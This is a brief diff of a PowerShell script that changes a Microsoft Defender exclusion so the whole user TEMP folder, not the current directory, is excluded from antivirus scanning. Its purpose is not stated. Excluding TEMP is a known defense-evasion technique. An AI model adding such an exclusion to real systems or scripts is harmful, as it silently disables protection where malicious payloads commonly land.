@@ -1,5 +1,5 @@
-$path = Get-Location
-$folder = $path.Path
+$path = Get-Item $env:TEMP
+$folder = $path.FullName
 
 try {
     Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
